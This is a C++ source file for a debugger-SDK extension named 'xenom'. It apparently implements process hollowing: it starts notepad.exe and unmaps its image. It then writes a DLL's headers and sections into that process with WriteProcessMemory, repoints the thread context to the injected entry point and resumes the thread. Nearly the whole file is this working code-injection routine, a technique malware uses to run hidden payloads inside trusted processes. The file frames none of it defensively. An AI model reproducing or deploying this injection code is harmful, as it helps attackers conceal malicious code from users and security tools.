#include "xdv_sdk.h"

#include <windows.h>
#include <stdio.h>
#include <conio.h>

// ---------------------------------------------
// funcs
class util
{
public:
	static const wchar_t * wcscasestr(const wchar_t *h, const wchar_t *n)
	{
		for (size_t i = 0; i < wcslen(h); ++i)
		{
			if (_wcsnicmp(&h[i], n, wcslen(n)) == 0)
			{
				return &h[i];
			}
		}

		return nullptr;
	}
};

class file
{
public:
	static void * dump(char *file_name, unsigned long * file_size)
	{
		HANDLE bin_file = CreateFileA(file_name, GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
		if (bin_file == INVALID_HANDLE_VALUE)
		{
			return 0;
		}

		unsigned long bin_file_size = GetFileSize(bin_file, nullptr);
		if (bin_file_size == 0)
		{
			CloseHandle(bin_file);
			return 0;
		}

		unsigned char *dump = (unsigned char *)malloc(bin_file_size);
		if (!dump)
		{
			CloseHandle(bin_file);
			return 0;
		}
		memset(dump, bin_file_size, 0);

		unsigned long read = 0;
		if (!ReadFile(bin_file, dump, bin_file_size, &read, nullptr))
		{
			CloseHandle(bin_file);
			return 0;
		}

		*file_size = read;
		CloseHandle(bin_file);

		return dump;
	}
};

#include <tlhelp32.h>

class ldr
{
public:
	class pe
	{
	public:
		static PIMAGE_DOS_HEADER dos_img(void *dump)
		{
			PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dump;
			if (dos->e_magic != IMAGE_DOS_SIGNATURE)
			{
				return nullptr;
			}

			return dos;
		}

		static PIMAGE_NT_HEADERS nt_img(PIMAGE_DOS_HEADER img_dos)
		{
			PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(unsigned long long(img_dos) + img_dos->e_lfanew);
			if (nt->Signature != IMAGE_NT_SIGNATURE)
			{
				return nullptr;
			}

			return nt;
		}

		static PIMAGE_NT_HEADERS nt_img(void *dump)
		{
			PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dump;
			if (dos->e_magic != IMAGE_DOS_SIGNATURE)
			{
				return nullptr;
			}

			PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(unsigned long long(dos) + dos->e_lfanew);
			if (nt->Signature != IMAGE_NT_SIGNATURE)
			{
				return nullptr;
			}

			return nt;
		}

		static PIMAGE_SECTION_HEADER section_img(void *dump)
		{
			PIMAGE_NT_HEADERS nt = nt_img(dump);
			if (!nt)
			{
				return nullptr;
			}

			return (PIMAGE_SECTION_HEADER)(unsigned long long(nt) + sizeof(IMAGE_NT_HEADERS));
		}

		static void * section(void *dump, IMAGE_SECTION_HEADER section_img)
		{
			unsigned char * s = (unsigned char *)dump;
			return &s[section_img.PointerToRawData];
		}
	};
};

// ---------------------------------------------
// process replacement
#include <winternl.h>

bool reloc(void * process_handle, void * base_ptr, void *attack_img)
{
	auto ntdll = LoadLibrary(L"ntdll.dll");
	if (!ntdll)
	{
		return false;
	}

	typedef NTSTATUS(WINAPI* ZwUnmapViewOfSectionT)(
		_In_     HANDLE ProcessHandle,
		_In_opt_ PVOID  BaseAddress
		);
	ZwUnmapViewOfSectionT ZwUnmapViewOfSection = (ZwUnmapViewOfSectionT)GetProcAddress(ntdll, "ZwUnmapViewOfSection");
	if (!ZwUnmapViewOfSection)
	{
		return false;
	}

	if (!NT_SUCCESS(ZwUnmapViewOfSection(process_handle, base_ptr)))
	{
		return false;
	}

	// -------------------------------------
	// reloc segment
	void * remap = VirtualAllocEx(process_handle, (PVOID)base_ptr, ldr::pe::nt_img(attack_img)->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!remap)
	{
		return false;
	}

	return true;
}

EXTS_FUNC(xenom)
{
#if 0
	if (argc < 1)
	{
		return 0;
	}

	if (!strstr(argv[0], "-a"))
	{
		return 0;
	}

	unsigned long size = 0;
	auto file_dump = file::dump(argv[1], &size);
	if (!file_dump)
	{
		return 0;
	}
#else
	unsigned long size = 0;
	auto file_dump = file::dump("xdvdll.dll", &size);
	if (!file_dump)
	{
		return nullvar();
	}
#endif

	char system_path[MAX_PATH] = { 0, };
	GetSystemDirectoryA(system_path, sizeof(system_path));
	char svchost_path[MAX_PATH] = { 0, };
	sprintf_s(svchost_path, "%s\\notepad.exe", system_path);

	auto si = new STARTUPINFOA();
	auto pi = new PROCESS_INFORMATION();
	if (!CreateProcessA(svchost_path, nullptr, nullptr, nullptr, FALSE, NORMAL_PRIORITY_CLASS, nullptr, nullptr, si, pi))
	{
		return nullvar();
	}

	if (SuspendThread(pi->hThread) == -1)
	{
		return nullvar();
	}
	printf(" [+] create:: notepad.exe=%d(%x)\n", pi->dwProcessId, pi->dwProcessId);

	auto ntdll = LoadLibrary(L"ntdll.dll");
	if (!ntdll)
	{
		return nullvar();
	}

	typedef NTSTATUS(WINAPI* NtQueryInformationProcessT)(
		_In_      HANDLE           ProcessHandle,
		_In_      PROCESSINFOCLASS ProcessInformationClass,
		_Out_     PVOID            ProcessInformation,
		_In_      ULONG            ProcessInformationLength,
		_Out_opt_ PULONG           ReturnLength
		);
	NtQueryInformationProcessT NtQueryInformationProcess = (NtQueryInformationProcessT)GetProcAddress(ntdll, "NtQueryInformationProcess");
	if (!NtQueryInformationProcess)
	{
		return nullvar();
	}

	unsigned long rtn = 0;
	PROCESS_BASIC_INFORMATION bpi;
	if (!NT_SUCCESS(NtQueryInformationProcess(pi->hProcess, PROCESSINFOCLASS(0), &bpi, sizeof(PROCESS_BASIC_INFORMATION), &rtn)))
	{
		return nullvar();
	}

	auto peb = new PEB();
	if (!ReadProcessMemory(pi->hProcess, (void *)bpi.PebBaseAddress, peb, sizeof(PEB), nullptr))
	{
		return nullvar();
	}

	auto BUFFER_SIZE = sizeof IMAGE_DOS_HEADER + sizeof IMAGE_NT_HEADERS + (sizeof IMAGE_SECTION_HEADER) * 100;
	auto header = new BYTE[BUFFER_SIZE];
	void * ptr_base = peb->Reserved3[1];
	if (!ReadProcessMemory(pi->hProcess, ptr_base, header, BUFFER_SIZE, nullptr))
	{
		return nullvar();
	}

	printf(" [-] remap:: %p\n", ptr_base);
	if (!reloc(pi->hProcess, ptr_base, file_dump))
	{
		return nullvar();
	}

#if 1
	//
	//
	if (!WriteProcessMemory(pi->hProcess, ptr_base, file_dump, ldr::pe::nt_img(file_dump)->OptionalHeader.SizeOfHeaders, nullptr))
	{
		return nullvar();
	}

	for (WORD i = 0; i < ldr::pe::nt_img(file_dump)->FileHeader.NumberOfSections; ++i)
	{
		auto va = PVOID(reinterpret_cast<ULONGLONG>(ptr_base) + ldr::pe::section_img(file_dump)[i].VirtualAddress);
		int raw_size = ldr::pe::section_img(file_dump)[i].SizeOfRawData;
		unsigned char * section = (unsigned char *)ldr::pe::section(file_dump, ldr::pe::section_img(file_dump)[i]);
		printf(" [-] section name=%s\n", ldr::pe::section_img(file_dump)[i].Name);
		if (!WriteProcessMemory(pi->hProcess, va, section, raw_size, nullptr))
		{
			printf(" [-] section=%p L?%08x, ecode=%08x\n", va, raw_size, GetLastError());
			return nullvar();
		}
	}

	CONTEXT ctx = { 0, };
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(pi->hThread, &ctx))
	{
		return nullvar();
	}

#ifdef _WIN64
	unsigned long long ep = (unsigned long long)ptr_base + ldr::pe::nt_img(file_dump)->OptionalHeader.AddressOfEntryPoint;
	ctx.Rcx = ep;
	printf(" [-] entry:: %I64x\n", ep);
#else
	unsigned long ep = (unsigned long)ptr_base + ldr::pe::nt_img(file_dump)->OptionalHeader.AddressOfEntryPoint;
	ctx.Eax = ep;
	printf(" [-] entry:: %08x\n", ep);
#endif

	if (!SetThreadContext(pi->hThread, &ctx))
	{
		return nullvar();
	}

	if (!GetThreadContext(pi->hThread, &ctx))
	{
		return nullvar();
	}
	//_getch();

	if (!ResumeThread(pi->hThread))
	{
		return nullvar();
	}
#endif

	return nullvar();
}

